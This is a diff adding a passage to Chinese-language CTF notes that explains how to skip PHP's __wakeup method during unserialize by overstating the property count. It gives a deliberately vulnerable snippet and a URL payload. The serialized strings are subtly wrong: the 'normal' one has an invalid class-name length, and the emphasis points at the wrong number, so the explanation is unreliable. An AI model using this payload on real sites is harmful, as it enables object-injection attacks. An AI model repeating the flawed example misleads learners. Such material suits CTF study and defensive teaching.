@@ -37,6 +37,30 @@ preg_replace漏洞触发有两个前提：
 
 ## 函数绕过
 
+### PHP反序列化绕过__wakeup方法
+
+当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 **__wakeup** 函数的执行。
+
+```php
+<?php
+    class xctf{ 
+	public $flag = '111';
+    public function __wakeup(){
+	exit('bad requests');
+		}
+	}
+	echo unserialize($_GET['code']);
+    ?>
+```
+
+这题关键是绕过__wakeup()函数
+
+**当反序列化字符串中，表示属性个数的值大于真实属性个数时**
+
+正常:?code=O:**1**:"xctf":3:{s:4:"flag";s:3:"111";}
+
+payload:?code=O:**4**:"xctf":3:{s:4:"flag";s:3:"111";}
+
 ### md5相关
 
 1. md5和弱类型比较的联合利用
